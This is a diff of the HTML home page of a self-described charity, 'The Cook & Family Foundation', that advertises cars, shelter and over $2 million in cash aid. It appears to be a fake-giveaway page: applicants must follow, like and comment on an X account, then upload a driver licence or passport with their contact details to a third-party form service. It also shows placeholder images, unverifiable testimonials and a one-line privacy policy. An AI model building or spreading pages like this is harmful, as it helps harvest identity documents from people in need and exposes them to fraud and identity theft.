@@ -1,65 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TC&FF Foundation</title>
-<link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>The Cook & Family Foundation | TC&FF</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body { font-family: 'Segoe UI', system-ui, sans-serif; }
+    .hero { background: linear-gradient(rgba(0,0,50,0.8), rgba(0,0,50,0.8)), url('https://picsum.photos/id/1015/2000/1200'); background-size: cover; background-position: center; }
+    .gold { color: #d4af37; }
+    .sidebar { background: #0a1f3d; }
+  </style>
 </head>
+<body class="bg-gray-50">
 
-<body>
+  <div class="flex min-h-screen">
 
-<aside class="sidebar">
-  <div class="logo">
-    <svg width="28" height="28" viewBox="0 0 24 24" fill="#D4AF37">
-      <path d="M12 2L2 7l10 5 10-5-10-5zm0 9L2 7v10l10 5 10-5V7l-10 4z"/>
-    </svg>
-    TC&FF
+    <!-- Sidebar -->
+    <div class="sidebar text-white w-72 hidden lg:flex flex-col fixed h-full">
+      <div class="p-8">
+        <h1 class="text-3xl font-bold mb-12">TC&FF</h1>
+        <nav class="space-y-6 text-lg">
+          <a href="#home" class="hover:text-[#d4af37] block">🏠 Home</a>
+          <a href="#aid" class="hover:text-[#d4af37] block">🎁 Aid & Prizes</a>
+          <a href="#how" class="hover:text-[#d4af37] block">📋 How It Works</a>
+          <a href="#testimonials" class="hover:text-[#d4af37] block">💬 Success Stories</a>
+          <a href="#apply" class="hover:text-[#d4af37] block">📝 Apply Now</a>
+          <a href="#" onclick="showPolicy()" class="hover:text-[#d4af37] block">📜 Policy & Cookies</a>
+        </nav>
+
+        <div class="mt-16">
+          <p class="text-sm opacity-75 mb-2">Contact</p>
+          <a href="mailto:thecookfoundation@proton.me" class="block text-[#d4af37]">thecookfoundation@proton.me</a>
+          <p class="text-sm">(343) 340-0052</p>
+          
+          <a href="https://x.com/Thecook_j" target="_blank" class="mt-10 flex items-center gap-3 text-[#d4af37] hover:text-white text-xl">
+            <i class="fab fa-x-twitter text-3xl"></i>
+            <span>Follow us on X @Thecook_j</span>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="flex-1 lg:ml-72">
+
+      <!-- Hero -->
+      <section id="home" class="hero text-white py-32 text-center">
+        <div class="max-w-5xl mx-auto px-6">
+          <h1 class="text-6xl md:text-7xl font-bold leading-tight">The Cook & Family Foundation</h1>
+          <p class="text-2xl mt-6">Cars • Shelter • Food • Over $2 Million in Cash Assistance</p>
+          <a href="#apply" class="mt-12 inline-block bg-[#d4af37] text-black font-semibold text-xl px-12 py-5 rounded-full">Apply For Help</a>
+        </div>
+      </section>
+
+      <!-- Aid Section -->
+      <section id="aid" class="py-20 bg-white">
+        <div class="max-w-6xl mx-auto px-6">
+          <h2 class="text-4xl font-bold text-center mb-12 gold">What We Provide</h2>
+          <img src="https://picsum.photos/id/1015/1200/400" alt="Aid" class="w-full rounded-3xl mb-12">
+          <div class="grid md:grid-cols-4 gap-8 text-center">
+            <div class="p-8">🚗 Cars</div>
+            <div class="p-8">🏠 Shelter</div>
+            <div class="p-8">🍲 Food</div>
+            <div class="p-8">💰 Cash Aid</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- How it Works -->
+      <section id="how" class="py-20 bg-gray-100">
+        <div class="max-w-5xl mx-auto px-6 text-center">
+          <h2 class="text-4xl font-bold mb-12">How To Apply</h2>
+          <div class="grid md:grid-cols-3 gap-10">
+            <div>1. Follow @Thecook_j on X, Like & Comment</div>
+            <div>2. Fill out the application form</div>
+            <div>3. Submit valid identification</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Testimonials -->
+      <section id="testimonials" class="py-20 bg-white">
+        <div class="max-w-6xl mx-auto px-6">
+          <h2 class="text-4xl font-bold text-center mb-12 gold">Success Stories</h2>
+          <img src="https://picsum.photos/id/1015/1200/400" alt="Stories" class="w-full rounded-3xl mb-10">
+          <div class="grid md:grid-cols-2 gap-8">
+            <div class="bg-gray-50 p-8 rounded-3xl">"They helped my family with shelter and food when we needed it most. Thank you!"</div>
+            <div class="bg-gray-50 p-8 rounded-3xl">"The cash support allowed me to continue my studies. God bless TC&FF."</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Application -->
+      <section id="apply" class="py-20 bg-[#0a1f3d] text-white">
+        <div class="max-w-2xl mx-auto px-6">
+          <h2 class="text-4xl font-bold text-center mb-10">Submit Your Application</h2>
+          
+          <form action="https://formspree.io/f/mbdvovzv" method="POST" enctype="multipart/form-data" class="space-y-6">
+            <input type="text" name="name" placeholder="Full Name" required class="w-full p-5 rounded-2xl bg-white/10 border border-white/30">
+            <input type="email" name="email" placeholder="Email" required class="w-full p-5 rounded-2xl bg-white/10 border border-white/30">
+            <input type="tel" name="phone" placeholder="Phone" class="w-full p-5 rounded-2xl bg-white/10 border border-white/30">
+            
+            <textarea name="message" rows="6" placeholder="Tell us your situation and how we can help..." required class="w-full p-5 rounded-2xl bg-white/10 border border-white/30"></textarea>
+            
+            <div>
+              <label class="block mb-3">Upload ID (Driver License / Passport)</label>
+              <input type="file" name="id_document" accept="image/*,.pdf" class="w-full p-4 bg-white/10 border border-white/30 rounded-2xl">
+            </div>
+
+            <button type="submit" class="w-full bg-[#d4af37] text-black py-6 text-xl font-semibold rounded-3xl">Submit Application</button>
+          </form>
+        </div>
+      </section>
+
+      <footer class="bg-black text-white py-12 text-center">
+        <p>&copy; 2026 The Cook & Family Foundation</p>
+        <p class="text-sm mt-2">thecookfoundation@proton.me | (343) 340-0052</p>
+        <p onclick="showPolicy()" class="cursor-pointer hover:text-[#d4af37] text-xs mt-6">Privacy Policy & Cookies</p>
+      </footer>
+    </div>
   </div>
 
-  <a class="active" href="index.html">Home</a>
-  <a href="apply.html">Apply</a>
-  <a href="admin.html">Admin Panel</a>
-  <a href="privacy.html">Privacy</a>
-  <a href="cookies.html">Cookies</a>
-
-  <div class="info">
-    <p>@Thecook_j</p>
-    <p>thecookfoundation@proton.me</p>
-    <p>3433400052</p>
+  <!-- Policy Modal -->
+  <div id="policyModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+    <div class="bg-white text-black max-w-2xl p-10 rounded-3xl">
+      <h2 class="text-3xl font-bold mb-6">Privacy Policy & Cookies</h2>
+      <p>Your information is used only to review applications and is kept confidential.</p>
+      <button onclick="hidePolicy()" class="mt-8 bg-black text-white px-10 py-4 rounded-2xl">Close</button>
+    </div>
   </div>
-</aside>
 
-<main class="main">
-
-  <section class="hero">
-    <h1>TC&FF Community Assistance</h1>
-    <p>Food • Shelter • Financial Support for Individuals & Families in Need</p>
-    <a class="btn" href="apply.html">Apply Now</a>
-  </section>
-
-  <section class="grid">
-    <div class="card">
-      <h3>Food Assistance</h3>
-      <p>Emergency food support for individuals and families.</p>
-    </div>
-
-    <div class="card">
-      <h3>Shelter Support</h3>
-      <p>Temporary housing assistance for urgent needs.</p>
-    </div>
-
-    <div class="card">
-      <h3>Financial Aid</h3>
-      <p>Direct assistance based on verified need assessment.</p>
-    </div>
-  </section>
-
-  <footer>
-    <p>© 2026 TC&FF Community Assistance Program</p>
-  </footer>
-
-</main>
-
+  <script>
+    function showPolicy() { document.getElementById('policyModal').classList.remove('hidden'); }
+    function hidePolicy() { document.getElementById('policyModal').classList.add('hidden'); }
+    function toggleMobileMenu() { alert("Navigation opened"); }
+  </script>
 </body>
 </html>
